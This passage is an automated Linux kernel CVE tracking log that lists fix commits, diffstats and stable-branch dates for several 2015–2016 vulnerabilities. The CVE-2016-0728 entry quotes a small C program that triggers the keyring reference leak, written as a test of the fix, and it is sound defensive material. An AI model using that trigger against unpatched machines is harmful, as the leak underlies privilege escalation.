Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: 6de62f15b581f920ade22d758f4c338311c2f0d4
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 6e8d8ecf438792ecf7a3207488fb4eebc4edb040
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Mon Jan 11 21:29:41 2016 +0800

    crypto: algif_skcipher - Add key check exception for cipher_null
    
    This patch adds an exception to the key check so that cipher_null
    users may continue to use algif_skcipher without setting a key.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/algif_skcipher.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: 6e8d8ecf438792ecf7a3207488fb4eebc4edb040
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a0fa2d037129a9849918a92d91b79ed6c7bd2818
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Mon Jan 4 13:36:12 2016 +0900

    crypto: algif_skcipher - Add nokey compatibility path
    
    This patch adds a compatibility path to support old applications
    that do acept(2) before setkey.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/algif_skcipher.c |  149 +++++++++++++++++++++++++++++++++++++++++++++--
 1 file changed, 144 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: a0fa2d037129a9849918a92d91b79ed6c7bd2818
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a1383cd86a062fc798899ab20f0ec2116cce39cb
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Mon Jan 11 21:26:50 2016 +0800

    crypto: skcipher - Add crypto_skcipher_has_setkey
    
    This patch adds a way for skcipher users to determine whether a key
    is required by a transform.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/skcipher.c         |    2 ++
 include/crypto/skcipher.h |    7 +++++++
 2 files changed, 9 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: a1383cd86a062fc798899ab20f0ec2116cce39cb
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.61.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a383292c86663bbc31ac62cc0c04fc77504636a6
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Wed Dec 30 20:24:17 2015 +0800

    crypto: af_alg - Fix socket double-free when accept fails
    
    When we fail an accept(2) call we will end up freeing the socket
    twice, once due to the direct sk_free call and once again through
    newsock.
    
    This patch fixes this by removing the sk_free call.
    
    Cc: stable@vger.kernel.org
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/af_alg.c |    4 +---
 1 file changed, 1 insertion(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: a383292c86663bbc31ac62cc0c04fc77504636a6
Linus Tag: 4.5
Stable Date: 2016-02-17
Stable Commit: d927a13739dd38be73d768eba9593e0b81082a00
Stable Tag: 3.14.61

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a5596d6332787fd383b3b5427b41f94254430827
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Fri Jan 8 21:28:26 2016 +0800

    crypto: hash - Add crypto_ahash_has_setkey
    
    This patch adds a way for ahash users to determine whether a key
    is required by a crypto_ahash transform.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/ahash.c        |    5 ++++-
 crypto/shash.c        |    4 +++-
 include/crypto/hash.h |    6 ++++++
 3 files changed, 13 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: a5596d6332787fd383b3b5427b41f94254430827
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.65.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c840ac6af3f8713a71b4d2363419145760bd6044
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Wed Dec 30 11:47:53 2015 +0800

    crypto: af_alg - Disallow bind/setkey/... after accept(2)
    
    Each af_alg parent socket obtained by socket(2) corresponds to a
    tfm object once bind(2) has succeeded.  An accept(2) call on that
    parent socket creates a context which then uses the tfm object.
    
    Therefore as long as any child sockets created by accept(2) exist
    the parent socket must not be modified or freed.
    
    This patch guarantees this by using locks and a reference count
    on the parent socket.  Any attempt to modify the parent socket will
    fail with EBUSY.
    
    Cc: stable@vger.kernel.org
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/af_alg.c         |   35 ++++++++++++++++++++++++++++++++---
 include/crypto/if_alg.h |    8 +++-----
 2 files changed, 35 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: c840ac6af3f8713a71b4d2363419145760bd6044
Linus Tag: 4.5
Stable Date: 2016-03-16
Stable Commit: c4eb62da6f34bfa9bbcbd005210a90fdfca7e367
Stable Tag: 3.14.65

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit dd504589577d8e8e70f51f997ad487a4cb6c026f
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Fri Dec 25 15:40:05 2015 +0800

    crypto: algif_skcipher - Require setkey before accept(2)
    
    Some cipher implementations will crash if you try to use them
    without calling setkey first.  This patch adds a check so that
    the accept(2) call will fail with -ENOKEY if setkey hasn't been
    done on the socket yet.
    
    Cc: stable@vger.kernel.org
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>

 crypto/algif_skcipher.c |   48 ++++++++++++++++++++++++++++++++++++++++-------
 1 file changed, 41 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: dd504589577d8e8e70f51f997ad487a4cb6c026f
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-0617:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9aacdd354d197ad64685941b36d28ea20ab88757
Author: Mike Kravetz <mike.kravetz@oracle.com>
Date:   Fri Jan 15 16:57:37 2016 -0800

    fs/hugetlbfs/inode.c: fix bugs in hugetlb_vmtruncate_list()
    
    Hillf Danton noticed bugs in the hugetlb_vmtruncate_list routine.  The
    argument end is of type pgoff_t.  It was being converted to a vaddr
    offset and passed to unmap_hugepage_range.  However, end was also being
    used as an argument to the vma_interval_tree_foreach controlling loop.
    In addition, the conversion of end to vaddr offset was incorrect.
    
    hugetlb_vmtruncate_list is called as part of a file truncate or
    fallocate hole punch operation.
    
    When truncating a hugetlbfs file, this bug could prevent some pages from
    being unmapped.  This is possible if there are multiple vmas mapping the
    file, and there is a sufficiently sized hole between the mappings.  The
    size of the hole between two vmas (A,B) must be such that the starting
    virtual address of B is greater than (ending virtual address of A <<
    PAGE_SHIFT).  In this case, the pages in B would not be unmapped.  If
    pages are not properly unmapped during truncate, the following BUG is
    hit:
    
    	kernel BUG at fs/hugetlbfs/inode.c:428!
    
    In the fallocate hole punch case, this bug could prevent pages from
    being unmapped as in the truncate case.  However, for hole punch the
    result is that unmapped pages will not be removed during the operation.
    For hole punch, it is also possible that more pages than desired will be
    unmapped.  This unnecessary unmapping will cause page faults to
    reestablish the mappings on subsequent page access.
    
    Fixes: 1bfad99ab (" hugetlbfs: hugetlb_vmtruncate_list() needs to take a range")Reported-by: Hillf Danton <hillf.zj@alibaba-inc.com>
    Signed-off-by: Mike Kravetz <mike.kravetz@oracle.com>
    Cc: Hugh Dickins <hughd@google.com>
    Cc: Naoya Horiguchi <n-horiguchi@ah.jp.nec.com>
    Cc: Davidlohr Bueso <dave@stgolabs.net>
    Cc: Dave Hansen <dave.hansen@linux.intel.com>
    Cc: <stable@vger.kernel.org>	[4.3]
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/hugetlbfs/inode.c |   19 +++++++++++--------
 1 file changed, 11 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-09-30
CVE: CVE-2016-0617
Break Date: 2015-09-08
Break Commit: 1bfad99ab42569807d0ca1698449cae5e8c0334a
Break Tag: 4.3
Linus Fix Date: 2016-01-15
Linus Commit: 9aacdd354d197ad64685941b36d28ea20ab88757
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-0723:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.61.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 5c17c861a357e9458001f021a7afa7aab9937439
Author: Peter Hurley <peter@hurleysoftware.com>
Date:   Sun Jan 10 22:40:55 2016 -0800

    tty: Fix unsafe ldisc reference via ioctl(TIOCGETD)
    
    ioctl(TIOCGETD) retrieves the line discipline id directly from the
    ldisc because the line discipline id (c_line) in termios is untrustworthy;
    userspace may have set termios via ioctl(TCSETS*) without actually
    changing the line discipline via ioctl(TIOCSETD).
    
    However, directly accessing the current ldisc via tty->ldisc is
    unsafe; the ldisc ptr dereferenced may be stale if the line discipline
    is changing via ioctl(TIOCSETD) or hangup.
    
    Wait for the line discipline reference (just like read() or write())
    to retrieve the "current" line discipline id.
    
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Peter Hurley <peter@hurleysoftware.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/tty/tty_io.c |   24 +++++++++++++++++++++++-
 1 file changed, 23 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2016-0723
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-26
Linus Commit: 5c17c861a357e9458001f021a7afa7aab9937439
Linus Tag: 4.5
Stable Date: 2016-02-17
Stable Commit: a08f833c45a2e803183ae82c153694711dccc16f
Stable Tag: 3.14.61

CVE-2016-0728:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.59.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 23567fd052a9abb6d67fe8e7a9ccdd9800a540f2
Author: Yevgeny Pats <yevgeny@perception-point.io>
Date:   Tue Jan 19 22:09:04 2016 +0000

    KEYS: Fix keyring ref leak in join_session_keyring()
    
    This fixes CVE-2016-0728.
    
    If a thread is asked to join as a session keyring the keyring that's already
    set as its session, we leak a keyring reference.
    
    This can be tested with the following program:
    
    	#include <stddef.h>
    	#include <stdio.h>
    	#include <sys/types.h>
    	#include <keyutils.h>
    
    	int main(int argc, const char *argv[])
    	{
    		int i = 0;
    		key_serial_t serial;
    
    		serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING,
    				"leaked-keyring");
    		if (serial < 0) {
    			perror("keyctl");
    			return -1;
    		}
    
    		if (keyctl(KEYCTL_SETPERM, serial,
    			   KEY_POS_ALL | KEY_USR_ALL) < 0) {
    			perror("keyctl");
    			return -1;
    		}
    
    		for (i = 0; i < 100; i++) {
    			serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING,
    					"leaked-keyring");
    			if (serial < 0) {
    				perror("keyctl");
    				return -1;
    			}
    		}
    
    		return 0;
    	}
    
    If, after the program has run, there something like the following line in
    /proc/keys:
    
    3f3d898f I--Q---   100 perm 3f3f0000     0     0 keyring   leaked-keyring: empty
    
    with a usage count of 100 * the number of times the program has been run,
    then the kernel is malfunctioning.  If leaked-keyring has zero usages or
    has been garbage collected, then the problem is fixed.
    
    Reported-by: Yevgeny Pats <yevgeny@perception-point.io>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Acked-by: Don Zickus <dzickus@redhat.com>
    Acked-by: Prarit Bhargava <prarit@redhat.com>
    Acked-by: Jarod Wilson <jarod@redhat.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/keys/process_keys.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2016-0728
Break Date: 2012-10-02
Break Commit: 3a50597de8635cd05133bd12c95681c82fe7b878
Break Tag: 3.8
Linus Fix Date: 2016-01-20
Linus Commit: 23567fd052a9abb6d67fe8e7a9ccdd9800a540f2
Linus Tag: 4.5
Stable Date: 2016-01-22
Stable Commit: 2e647bca7a2c885acdcd89da631b8dd5edc9e310
Stable Tag: 3.14.59

CVE-2016-0758:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa
Author: David Howells <dhowells@redhat.com>
Date:   Tue Feb 23 11:03:12 2016 +0000

    KEYS: Fix ASN.1 indefinite length object parsing
    
    This fixes CVE-2016-0758.
    
    In the ASN.1 decoder, when the length field of an ASN.1 value is extracted,
    it isn't validated against the remaining amount of data before being added
    to the cursor.  With a sufficiently large size indicated, the check:
    
    	datalen - dp < 2
    
    may then fail due to integer overflow.
    
    Fix this by checking the length indicated against the amount of remaining
    data in both places a definite length is determined.
    
    Whilst we're at it, make the following changes:
    
     (1) Check the maximum size of extended length does not exceed the capacity
         of the variable it's being stored in (len) rather than the type that
         variable is assumed to be (size_t).
    
     (2) Compare the EOC tag to the symbolic constant ASN1_EOC rather than the
         integer 0.
    
     (3) To reduce confusion, move the initialisation of len outside of:
    
    	for (len = 0; n > 0; n--) {
    
         since it doesn't have anything to do with the loop counter n.
    
    Signed-off-by: David Howells <dhowells@redhat.com>
    Reviewed-by: Mimi Zohar <zohar@linux.vnet.ibm.com>
    Acked-by: David Woodhouse <David.Woodhouse@intel.com>
    Acked-by: Peter Jones <pjones@redhat.com>

 lib/asn1_decoder.c |   16 +++++++++-------
 1 file changed, 9 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-0758
Break Date: 2012-10-08
Break Commit: 42d5ec27f873c654a68f7f865dcd7737513e9508
Break Tag: 3.7
Linus Fix Date: 2016-05-12
Linus Commit: 23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-0774:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-0774
Break Date: -
Break Commit: local-2016-0774-break
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-0774-fix
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-0821:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.68.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8a5e5e02fc83aaf67053ab53b359af08c6c49aaf
Author: Vasily Kulikov <segoon@openwall.com>
Date:   Wed Sep 9 15:36:00 2015 -0700

    include/linux/poison.h: fix LIST_POISON{1,2} offset
    
    Poison pointer values should be small enough to find a room in
    non-mmap'able/hardly-mmap'able space.  E.g.  on x86 "poison pointer space"
    is located starting from 0x0.  Given unprivileged users cannot mmap
    anything below mmap_min_addr, it should be safe to use poison pointers
    lower than mmap_min_addr.
    
    The current poison pointer values of LIST_POISON{1,2} might be too big for
    mmap_min_addr values equal or less than 1 MB (common case, e.g.  Ubuntu
    uses only 0x10000).  There is little point to use such a big value given
    the "poison pointer space" below 1 MB is not yet exhausted.  Changing it
    to a smaller value solves the problem for small mmap_min_addr setups.
    
    The values are suggested by Solar Designer:
    http://www.openwall.com/lists/oss-security/2015/05/02/6
    
    Signed-off-by: Vasily Kulikov <segoon@openwall.com>
    Cc: Solar Designer <solar@openwall.com>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 include/linux/poison.h |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-03-12
CVE: CVE-2016-0821
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-09-10
Linus Commit: 8a5e5e02fc83aaf67053ab53b359af08c6c49aaf
Linus Tag: 4.3
Stable Date: 2016-05-04
Stable Commit: 703d87a503141999a6749263d0a8caf038ce5b75
Stable Tag: 3.14.68

CVE-2016-0823:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.37.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce
Author: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
Date:   Mon Mar 9 23:11:12 2015 +0200

    pagemap: do not leak physical addresses to non-privileged userspace
    
    As pointed by recent post[1] on exploiting DRAM physical imperfection,
    /proc/PID/pagemap exposes sensitive information which can be used to do
    attacks.
    
    This disallows anybody without CAP_SYS_ADMIN to read the pagemap.
    
    [1] http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html
    
    [ Eventually we might want to do anything more finegrained, but for now
      this is the simple model.   - Linus ]
    
    Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Acked-by: Konstantin Khlebnikov <khlebnikov@openvz.org>
    Acked-by: Andy Lutomirski <luto@amacapital.net>
    Cc: Pavel Emelyanov <xemul@parallels.com>
    Cc: Andrew Morton <akpm@linux-foundation.org>
    Cc: Mark Seaborn <mseaborn@chromium.org>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/proc/task_mmu.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-03-12
CVE: CVE-2016-0823
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-03-17
Linus Commit: ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce
Linus Tag: 4.0
Stable Date: 2015-03-26
Stable Commit: 26f7f4d46a2cbfa6fbb633d228ec34cf969589d5
Stable Tag: 3.14.37

CVE-2016-1237:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 485e71e8fb6356c08c7fc6bcce4bf02c9a9a663f
Author: Andreas Gruenbacher <agruenba@redhat.com>
Date:   Wed Jun 22 23:57:25 2016 +0200

    posix_acl: Add set_posix_acl
    
    Factor out part of posix_acl_xattr_set into a common function that takes
    a posix_acl, which nfsd can also call.
    
    The prototype already exists in include/linux/posix_acl.h.
    
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>
    Cc: stable@vger.kernel.org
    Cc: Christoph Hellwig <hch@infradead.org>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Signed-off-by: J. Bruce Fields <bfields@redhat.com>

 fs/posix_acl.c |   42 +++++++++++++++++++++++-------------------
 1 file changed, 23 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-29
CVE: CVE-2016-1237
Break Date: 2014-01-26
Break Commit: 4ac7249ea5a0ceef9f8269f63f33cc873c3fac61
Break Tag: 3.14
Linus Fix Date: 2016-06-24
Linus Commit: 485e71e8fb6356c08c7fc6bcce4bf02c9a9a663f
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 8977f46fff476e4a5c5ab270a78c9ab8b548d645
Stable Tag: 3.14.74

CVE-2016-1237:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 999653786df6954a31044528ac3f7a5dadca08f4
Author: Ben Hutchings <ben@decadent.org.uk>
Date:   Wed Jun 22 19:43:35 2016 +0100

    nfsd: check permissions when setting ACLs
    
    Use set_posix_acl, which includes proper permission checks, instead of
    calling ->set_acl directly.  Without this anyone may be able to grant
    themselves permissions to a file by setting the ACL.
    
    Lock the inode to make the new checks atomic with respect to set_acl.
    (Also, nfsd was the only caller of set_acl not locking the inode, so I
    suspect this may fix other races.)
    
    This also simplifies the code, and ensures our ACLs are checked by
    posix_acl_valid.
    
    The permission checks and the inode locking were lost with commit
    4ac7249e, which changed nfsd to use the set_acl inode operation directly
    instead of going through xattr handlers.
    
    Reported-by: David Sinquin <david@sinquin.eu>
    [agreunba@redhat.com: use set_posix_acl]
    Fixes: 4ac7249e
    Cc: Christoph Hellwig <hch@infradead.org>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: stable@vger.kernel.org
    Signed-off-by: J. Bruce Fields <bfields@redhat.com>

 fs/nfsd/nfs2acl.c |   20 ++++++++++----------
 fs/nfsd/nfs3acl.c |   16 +++++++---------
 fs/nfsd/nfs4acl.c |   16 ++++++++--------
 3 files changed, 25 insertions(+), 27 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-29
CVE: CVE-2016-1237
Break Date: 2014-01-26
Break Commit: 4ac7249ea5a0ceef9f8269f63f33cc873c3fac61
Break Tag: 3.14
Linus Fix Date: 2016-06-24
Linus Commit: 999653786df6954a31044528ac3f7a5dadca08f4
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 5dbe3b2621e5ef5a54cb7351209f0365f7223fd2
Stable Tag: 3.14.74

CVE-2016-1575:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-1575
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-1575-1
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-1575:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-1575
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-1575-2
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-1576:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-1576
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-1576-1
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-1576:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-1576
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-1576-2
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-1583:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.75.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 2f36db71009304b3f0b95afacd8eba1f9f046b87
Author: Jann Horn <jannh@google.com>
Date:   Wed Jun 1 11:55:06 2016 +0200

    ecryptfs: forbid opening files without mmap handler
    
    This prevents users from triggering a stack overflow through a recursive
    invocation of pagefault handling that involves mapping procfs files into
    virtual memory.
    
    Signed-off-by: Jann Horn <jannh@google.com>
    Acked-by: Tyler Hicks <tyhicks@canonical.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ecryptfs/kthread.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-1583
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-10
Linus Commit: 2f36db71009304b3f0b95afacd8eba1f9f046b87
Linus Tag: 4.7
Stable Date: 2016-08-10
Stable Commit: 9e7af3525df35cc5e5c83401dac78b2ad49ae13e
Stable Tag: 3.14.75

CVE-2016-1583:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e54ad7f1ee263ffa5a2de9c609d58dfa27b21cd9
Author: Jann Horn <jannh@google.com>
Date:   Wed Jun 1 11:55:05 2016 +0200

    proc: prevent stacking filesystems on top
    
    This prevents stacking filesystems (ecryptfs and overlayfs) from using
    procfs as lower filesystem.  There is too much magic going on inside
    procfs, and there is no good reason to stack stuff on top of procfs.
    
    (For example, procfs does access checks in VFS open handlers, and
    ecryptfs by design calls open handlers from a kernel thread that doesn't
    drop privileges or so.)
    
    Signed-off-by: Jann Horn <jannh@google.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/proc/root.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-1583
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-10
Linus Commit: e54ad7f1ee263ffa5a2de9c609d58dfa27b21cd9
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-1583:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 29d6455178a09e1dc340380c582b13356227e8df
Author: Jann Horn <jannh@google.com>
Date:   Wed Jun 1 11:55:07 2016 +0200

    sched: panic on corrupted stack end
    
    Until now, hitting this BUG_ON caused a recursive oops (because oops
    handling involves do_exit(), which calls into the scheduler, which in
    turn raises an oops), which caused stuff below the stack to be
    overwritten until a panic happened (e.g.  via an oops in interrupt
